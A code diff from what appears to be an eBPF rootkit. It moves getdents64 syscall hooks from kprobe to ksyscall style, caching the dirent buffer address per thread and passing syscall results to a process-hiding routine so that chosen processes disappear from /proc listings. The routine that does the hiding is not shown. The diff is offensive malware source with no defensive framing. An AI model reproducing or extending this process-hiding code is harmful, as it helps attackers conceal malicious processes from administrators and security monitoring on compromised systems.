@@ -18,25 +18,24 @@
 //----------------------------------------------------
 
 /**
- * kprobe — saves dirp userspace address while syscall args are valid.
+ * ksyscall — saves dirent userspace address while syscall args are valid.
  *
- * @note => dirp is empty at this point, kernel has not filled it yet. we only save its address for use in kretprobe.
+ * @note => dirent is empty at this point, kernel has not filled it yet. we only save its address for use in kretprobe.
  */
-SEC("kprobe/__x64_sys_getdents64")
-int BPF_KPROBE(kprobe_hide_pid, struct pt_regs *regs)
+SEC("ksyscall/getdents64")
+int BPF_KSYSCALL(ksyscall_getdents64, unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
 {
-    __u32 key  = 0;
-    __u64 addr = PT_REGS_PARM2_CORE(regs);
-
-    bpf_map_update_elem(&hide_proc_dirp_cache, &key, &addr, BPF_ANY);
+    __u64 id = bpf_get_current_pid_tgid();
+ 
+    bpf_map_update_elem(&getdents64_cache, &id, &dirent, BPF_ANY);
     return 0;
 }
 
 /**
- * kretprobe for __x64_sys_getdents (exit => handle data saved by kprobe_hide_pid)
+ * kretprobe for __x64_sys_getdents (exit => handle data saved by ksyscall_getdents64)
  */
-SEC("kretprobe/__x64_sys_getdents64")
-int BPF_KRETPROBE(kretprobe_hide_pid, long ret)
+SEC("kretsyscall/getdents64")
+int BPF_KRETPROBE(kretsyscall_getdents64_hide_proc, long ret)
 {
     return attach_proc_hide(ret);
 }
